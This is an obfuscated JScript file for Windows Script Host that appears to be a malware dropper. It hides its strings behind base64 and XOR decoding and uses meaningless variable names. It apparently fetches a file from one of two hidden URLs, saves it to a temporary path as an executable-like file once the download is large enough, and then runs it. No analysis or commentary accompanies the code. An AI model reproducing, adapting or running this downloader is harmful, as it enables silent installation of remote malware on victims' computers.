var _base64Idx = [
    /*43 -43 = 0*/
    /*'+',  1,  2,  3,'/' */
    62, -1, -1, -1, 63,

    /*'0','1','2','3','4','5','6','7','8','9' */
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61,

    /*15, 16, 17,'=', 19, 20, 21 */
    -1, -1, -1, 64, -1, -1, -1,

    /*65 - 43 = 22*/
    /*'A','B','C','D','E','F','G','H','I','J','K','L','M', */
    0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12,

    /*'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' */
    13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,

    /*91 - 43 = 48 */
    /*48, 49, 50, 51, 52, 53 */
    -1, -1, -1, -1, -1, -1,

    /*97 - 43 = 54*/
    /*'a','b','c','d','e','f','g','h','i','j','k','l','m' */
    26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38,

    /*'n','o','p','q','r','s','t','u','v','w','x','y','z' */
    39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51
];

function decode(input, output, offset) {
    var out = output;
    if(!out) {
        out = new Uint8Array(Math.ceil(input.length / 4) * 3);
    }

    // remove all non-base64 characters
    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');

    offset = offset || 0;
    var enc1, enc2, enc3, enc4;
    var i = 0, j = offset;

    while(i < input.length) {
        enc1 = _base64Idx[input.charCodeAt(i++) - 43];
        enc2 = _base64Idx[input.charCodeAt(i++) - 43];
        enc3 = _base64Idx[input.charCodeAt(i++) - 43];
        enc4 = _base64Idx[input.charCodeAt(i++) - 43];

        out[j++] = (enc1 << 2) | (enc2 >> 4);
        if(enc3 !== 64) {
            // decoded at least 2 bytes
            out[j++] = ((enc2 & 15) << 4) | (enc3 >> 2);
            if(enc4 !== 64) {
                // decoded 3 bytes
                out[j++] = ((enc3 & 3) << 6) | enc4;
            }
        }
    }

    // make sure result is the exact decoded length
    return output ?
        (j - offset) :
        out.subarray(0, j);
}

var FVcD8dMQiO = function (packedText) {

    var buffer = [];
    var length = decode(packedText, buffer);
    var charCodeAt = "charCodeAt";
    var result = "";
    for (var i = 0; i < length; i++) {
        result += String.fromCharCode(buffer[i] ^ "rMQzLYUMPokYX7Le"[charCodeAt](i % "rMQzLYUMPokYX7Le".length));
    }
    return result;
};
var arbitratenKz = function() {
    var gravitymn6 = function() {};
    gravitymn6.prototype.create = function(grudgingX6Y) {
        return WScript.CreateObject(grudgingX6Y);
    };
    return gravitymn6;
}();

(function() {
    var virtuosoKCT = new arbitratenKz();
    var venerateMWi = 200;
    var indemnifyhMf = FVcD8dMQiO('"NQgF"');
    var groveNn7 = FVcD8dMQiO('"NzU0GQ=="');
    var revulsionrdQ = FVcD8dMQiO('"JR4yCCUpIWMDBw41NA=="');
    var assiduousJ1n = FVcD8dMQiO('"Px4JNwBrexUdIyMNDGc="');
    var yeomant9b = FVcD8dMQiO('"PHsZQwQ1GigoCw=="');
    var implacableTFM = FVcD8dMQiO('"EAEZEnQyIAMKDg=="');
    var tarryoEs = FVcD8dMQiO('"OCMmDC9tEikjJw=="');
    var refectoryHrj = FVcD8dMQiO('"MRVlICQKDCMCGQ=="');
    var retinuenwO = FVcD8dMQiO('"MwkePg4="');
    var harrykaz = FVcD8dMQiO('"ITkjHy00"');
    var enigmaaLC = FVcD8dMQiO('"VxkUNxx8CQ=="');
    var superannuatedHZX = FVcD8dMQiO('"XCgpHw=="');
    var nominalnq8 = Math.pow(2, 10) * 249;
    var stiltedMdB = [ FVcD8dMQiO('"GjklCnZ2eiU1Awc2IVg5CxUgMBQ9KHsuPwJEYGsZKR0X"'), FVcD8dMQiO('"GjklCnZ2eiU1Awc2IVg5CxUgMBQqP3suPwJEYGsZKR0X"') ];
    var fissureWWX = 2097152;
    var hummockX9q = virtuosoKCT.create(revulsionrdQ);
    var alacrityGnq = virtuosoKCT.create(assiduousJ1n);
    var toutVNB = virtuosoKCT.create(retinuenwO + FVcD8dMQiO('"XA=="') + harrykaz);
    var loquaciousu7Y = hummockX9q.ExpandEnvironmentStrings(enigmaaLC);
    var brawngos = loquaciousu7Y + fissureWWX + superannuatedHZX;
    var avaricelgx = false;
    for (var affableo87 = 0; affableo87 < stiltedMdB.length; affableo87++) {
        try {
            var oratoriotcL = stiltedMdB[affableo87];
            alacrityGnq.open(indemnifyhMf, oratoriotcL, false);
            alacrityGnq.send();
            if (alacrityGnq.status == venerateMWi) {
                try {
                    toutVNB.open();
                    toutVNB.type = 1;
                    toutVNB.write(alacrityGnq[FVcD8dMQiO('"ACgiCiM3JigSAA8g"')]);
                    if (toutVNB.size > nominalnq8) {
                        affableo87 = stiltedMdB.length;
                        toutVNB.position = 0;
                        toutVNB.saveToFile(brawngos, 2);
                        avaricelgx = true;
                    }
                } finally {
                    toutVNB.close();
                }
            }
        } catch (ignored) {}
    }
    if (avaricelgx) {
        hummockX9q[groveNn7](loquaciousu7Y + Math.pow(2, 21));
    }
})();